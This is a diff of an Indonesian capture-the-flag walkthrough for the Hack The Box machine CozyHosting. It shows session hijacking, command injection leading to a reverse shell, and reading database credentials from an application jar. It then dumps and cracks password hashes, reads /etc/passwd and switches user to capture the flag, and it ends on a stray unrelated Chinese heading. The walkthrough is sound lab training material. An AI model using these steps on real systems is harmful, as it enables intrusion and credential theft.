@@ -141,7 +141,7 @@ Selain itu saya menemukan endpoint yang cukup unik `/actuator/sessions`, saya me
 
 Saya mencoba memanfaatkan sessions tersebut dengan melakukan manipulasi sesi menggnakan `inspect element`
 ![Screenshot at 2023-09-09 21-36-57](https://github.com/k1r4-id/k1r4-id.github.io/assets/62828015/b530d0ec-e4ed-460a-88ae-4fb9a1e11d98)
-> Dan kalian bisa login ke dashboard admin menggunakan credential apapun, karena celah login pada web ini hanya pada cookie sessions leaked
+> kalian bisa login ke dashboard admin menggunakan credential apapun, karena celah login pada web ini hanya pada cookie sessions leaked
 
 Disini saya hanya menemukan form untuk koneksi ssh
 ![Screenshot at 2023-09-09 21-32-47](https://github.com/k1r4-id/k1r4-id.github.io/assets/62828015/f0f08f86-1fff-444e-9aec-336b02ef1761)
@@ -150,7 +150,8 @@ Disini saya hanya menemukan form untuk koneksi ssh
 Pada awalnya saya menemukan kejanggalan saat meneliti form tersebut, saya menemukan adanya celah `comand injection` pada parameter username
 ![Screenshot at 2023-09-09 21-51-40](https://github.com/k1r4-id/k1r4-id.github.io/assets/62828015/d65a0897-e4bb-404c-a27f-cbcf5076101d)
 
-Karena saya berhasil melakukan `Comand Injection` lalu tahap berikutnya saya akan melakukan `Reverse Shell` untuk mengambil alih web server tersebut
+Karena saya berhasil melakukan `Comand Injection` lalu tahap berikutnya saya akan melakukan `Reverse Shell` untuk masuk ke web server tersebut
+![Screenshot at 2023-09-10 03-29-13](https://github.com/k1r4-id/k1r4-id.github.io/assets/62828015/8517d5d0-ffd7-4e56-9753-a34982c9a64a)
 
 ```sh     
 #!/bin/bash
@@ -170,6 +171,127 @@ Saya mendapatkan akses shell sebagai pengguna APP
 (local) pwncat$                                                                                                         
 (remote) app@cozyhosting:/app$ 
 ```
+Saya menemukan file `jar` difolder `app`, lalu saya copy file tersebut ke dir `tmp`  dan saya extract. Saya menemukan credential database `postgresql` didalam file `application.properties` pada directory `/BOOT-INF/classes` 
+
+```sh
+(remote) app@cozyhosting:/app$ ls
+cloudhosting-0.0.1.jar
+(remote) app@cozyhosting:/app$ cp cloudhosting-0.0.1.jar /tmp/
+(remote) app@cozyhosting:/app$ cd /tmp/
+(remote) app@cozyhosting:/tmp$ ls
+BOOT-INF
+cloudhosting-0.0.1.jar
+hsperfdata_app
+META-INF
+org
+systemd-private-4c3ec572ed18415091ba4338c21d71c1-ModemManager.service-Yq4WNZ
+systemd-private-4c3ec572ed18415091ba4338c21d71c1-systemd-logind.service-Q8MYmy
+systemd-private-4c3ec572ed18415091ba4338c21d71c1-systemd-resolved.service-Z4nt4m
+systemd-private-4c3ec572ed18415091ba4338c21d71c1-systemd-timesyncd.service-XhL0kU
+systemd-private-4c3ec572ed18415091ba4338c21d71c1-upower.service-SY3DWm
+tomcat.8080.3718851477085433742
+tomcat-docbase.8080.6252866923267777882
+vmware-root_765-4248156194
+(remote) app@cozyhosting:/tmp$ cd BOOT-INF/
+(remote) app@cozyhosting:/tmp/BOOT-INF$ ls
+classes  classpath.idx	layers.idx  lib
+(remote) app@cozyhosting:/tmp/BOOT-INF$ cd classes/
+(remote) app@cozyhosting:/tmp/BOOT-INF/classes$ ls
+application.properties	htb  static  templates
+(remote) app@cozyhosting:/tmp/BOOT-INF/classes$ cat application.properties 
+server.address=127.0.0.1
+server.servlet.session.timeout=5m
+management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
+management.endpoint.sessions.enabled = true
+spring.datasource.driver-class-name=org.postgresql.Driver
+spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
+spring.jpa.hibernate.ddl-auto=none
+spring.jpa.database=POSTGRESQL
+spring.datasource.platform=postgres
+spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+spring.datasource.username=postgres
+spring.datasource.password=Vg&nvzAQ7XxR
+```
+Saya berhasil connect ke services `postgresql` menggunakan credential tersebut, dan saya melihat ada databases apa saja di dalamnya
+
+```sh
+(remote) app@cozyhosting:/tmp/BOOT-INF/classes$ psql -h localhost -U postgres
+Password for user postgres: 
+psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+Type "help" for help.
+
+postgres=# \l
+                                   List of databases
+    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
+-------------+----------+----------+-------------+-------------+-----------------------
+ cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+ postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+ template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+             |          |          |             |             | postgres=CTc/postgres
+ template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+             |          |          |             |             | postgres=CTc/postgres
+(4 rows)
+
+postgres=# 
+```
+Saya connect ke dalam databases cozyhosting dan menemukan hash user admin dan kanderson
+
+```sh
+postgres=# \c cozyhosting
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+You are now connected to database "cozyhosting" as user "postgres".
+
+cozyhosting=# \d
+              List of relations
+ Schema |     Name     |   Type   |  Owner   
+--------+--------------+----------+----------
+ public | hosts        | table    | postgres
+ public | hosts_id_seq | sequence | postgres
+ public | users        | table    | postgres
+(3 rows)
+
+cozyhosting=# select * from users;
+   name    |                           password                           | role  
+-----------+--------------------------------------------------------------+-------
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+(2 rows)
+
+cozyhosting=# 
+```
+Lalu saya memecahkan hash tersebut menggunakan `john ripper` dan saya berhasil memecahkannya
+
+```sh
+┌[parrot]─[03:56-10/09]─[/home/k1r4/Documents/exercise/HTB/Easy/CozyHosting]
+└╼k1r4$john hash -w=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+manchesterunited (?)
+```
+Dikarenakan saya tidak menemukan user `admin` dan `kanderson`, saya mencoba login menggunakan user `josh`
+
+```sh
+(remote) app@cozyhosting:/$ cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+josh:x:1003:1003::/home/josh:/usr/bin/bash
+```
+Saya berhasil connect kedalam user `josh` dan mendapatkan flag user.txt
+```sh
+(remote) app@cozyhosting:/$ su josh
+Password: 
+josh@cozyhosting:~$ ls
+user.txt
+josh@cozyhosting:~$ cat user.txt 
+3cbc3707136b3032418291fc37534790
+```
+##PRIVILAGE ESCALATION
+
+
 
 #### 新的设备特性
 
